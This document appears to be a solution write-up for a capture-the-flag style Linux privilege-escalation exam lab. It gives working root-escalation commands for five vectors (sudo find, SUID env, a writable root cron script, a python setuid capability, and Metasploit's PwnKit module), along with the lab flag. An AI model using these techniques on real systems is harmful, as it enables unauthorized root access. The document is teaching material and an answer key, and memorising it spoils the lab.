---
tags: [css-exam, privesc, metasploit, solution]
---
# Privilege Escalation Lab — Solution

Five independent paths to root in the enumeration output. Any one works.

## Vector 1 — sudo `find` (GTFOBins)
`enum/sudo_l.txt`: `(root) NOPASSWD: /usr/bin/find`.
```
sudo find . -exec /bin/sh \; -quit
# id -> uid=0(root).  (Also: sudo less /var/log/syslog  then type  !/bin/sh)
```
**Why:** `find -exec` runs a command *as the sudo'd user (root)*, no password needed.

## Vector 2 — SUID `env` / `pkexec`
`enum/suid.txt`: `/usr/bin/env` is SUID-root, and `pkexec` is present.
```
/usr/bin/env /bin/sh -p           # SUID env drops a root shell (-p keeps euid)
```
`pkexec` + Ubuntu 21.10 → **CVE-2021-4034 (PwnKit)** local root (compile the public PoC, or use the MSF module below).

## Vector 3 — world-writable root cron
`enum/cron.txt`: `/opt/scripts/backup.sh` is `rwxrwxrwx` and runs as **root** every minute.
```
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/scripts/backup.sh
# wait up to 60s, then:
/tmp/rootbash -p                  # id -> euid=0
```

## Vector 4 — `cap_setuid` capability on python
`enum/capabilities.txt`: `/usr/bin/python3.9 = cap_setuid+ep`.
```
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Vector 5 — kernel / PwnKit via Metasploit (the MSF half)
From a Meterpreter session on the box:
```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run                                  # lists likely local exploits (pkexec, sudo, kernel)

msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 > set SESSION 1
msf6 > set LHOST <your-ip>
msf6 > run                                  # -> new Meterpreter as root
meterpreter > getuid                        # root
meterpreter > cat /root/flag.txt
```
Other modules the suggester may offer: `exploit/linux/local/sudo_baron_samedit`,
`exploit/linux/local/su_login`, a matching kernel LPE.
> Note: `getsystem` is a **Windows** command — on Linux you escalate with a **local exploit module**
> (above) or a GTFOBins vector, not `getsystem`.

## Flag
`/root/flag.txt` → `FLAG{r00t_via_sudo_find_suid_env_cron_cap_or_pkexec}`

## Method (memorise)
After a foothold: `id` → `sudo -l` → SUID (`find / -perm -4000`) → capabilities (`getcap -r /`) →
cron (`/etc/crontab`, writable scripts) → kernel/distro (`uname -a`). Map each finding to **GTFOBins**;
in Metasploit, `local_exploit_suggester` automates the "which exploit" question.
